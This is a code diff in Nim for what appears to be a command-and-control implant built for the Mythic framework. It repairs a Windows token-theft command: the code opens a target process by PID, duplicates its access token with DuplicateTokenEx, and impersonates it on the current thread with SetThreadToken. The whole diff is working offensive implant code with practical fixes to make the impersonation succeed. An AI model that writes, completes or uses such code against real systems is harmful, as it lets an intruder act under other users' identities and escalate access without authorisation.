@@ -14,15 +14,11 @@ when defined(windows):
     
     try:
       # Parse PID from parameters
-      let pidStr = if params.kind == JString:
-                    params.getStr()
-                  elif params.hasKey("pid"):
-                    $params["pid"]
-                  else:
-                    return mythicError(taskId, "No PID provided")
+      # Mythic sends this as a JSON string "8772" which parses to a JString
+      let pidStr = $params
       
       let pid = try:
-        pidStr.strip().parseInt().uint32
+        pidStr.strip(chars = {'"', ' '}).parseInt().uint32
       except:
         return mythicError(taskId, &"Invalid PID: {pidStr}")
       
@@ -35,7 +31,7 @@ when defined(windows):
         let errorCode = GetLastError()
         return mythicError(taskId, &"Failed to open process {pid}. Error code: {errorCode}")
       
-      # Open the process token
+      # Open the process token - only TOKEN_DUPLICATE and TOKEN_QUERY needed
       var processToken: HANDLE = 0
       if OpenProcessToken(processHandle, TOKEN_DUPLICATE or TOKEN_QUERY, addr processToken) == 0:
         let errorCode = GetLastError()
@@ -43,15 +39,24 @@ when defined(windows):
         return mythicError(taskId, &"Failed to open process token. Error code: {errorCode}")
       
       # Duplicate the token to create an impersonation token
+      # Use hardcoded values to match Windows API exactly:
+      # SecurityImpersonation = 2 (SECURITY_IMPERSONATION_LEVEL enum)
+      # TokenImpersonation = 2 (TOKEN_TYPE enum)
       var impersonationToken: HANDLE = 0
-      if DuplicateTokenEx(processToken, MAXIMUM_ALLOWED, nil, SecurityImpersonation, 
-                          tokenImpersonation, addr impersonationToken) == 0:
+      const SecurityImpersonationLevel = 2.DWORD
+      const TokenImpersonationType = 2.DWORD
+      
+      if cfg.debug:
+        echo &"[DEBUG] About to duplicate token with SecurityLevel={SecurityImpersonationLevel}, TokenType={TokenImpersonationType}"
+      
+      if DuplicateTokenEx(processToken, MAXIMUM_ALLOWED, nil, SecurityImpersonationLevel, 
+                          TokenImpersonationType, addr impersonationToken) == 0:
         let errorCode = GetLastError()
         CloseHandle(processToken)
         CloseHandle(processHandle)
         return mythicError(taskId, &"Failed to duplicate token. Error code: {errorCode}")
       
-      # Clean up process handles
+      # Clean up process handles (but keep impersonationToken)
       CloseHandle(processToken)
       CloseHandle(processHandle)
       
@@ -61,14 +66,14 @@ when defined(windows):
         CloseHandle(impersonationToken)
         return mythicError(taskId, &"Failed to revert to self. Error code: {errorCode}")
       
-      # Set the thread token (SetThreadToken makes a copy, so we keep our handle)
+      # Use SetThreadToken (like oopsie) instead of ImpersonateLoggedOnUser
+      # SetThreadToken works better with duplicated tokens
       if SetThreadToken(nil, impersonationToken) == 0:
         let errorCode = GetLastError()
         CloseHandle(impersonationToken)
         return mythicError(taskId, &"Failed to set thread token. Error code: {errorCode}")
       
-      # Store the token handle for later cleanup
-      # We keep the handle since SetThreadToken doesn't take ownership
+      # Store the token handle - we must keep it alive while impersonated
       setTokenHandle(impersonationToken)
       
       # Get the new user context (after impersonation)
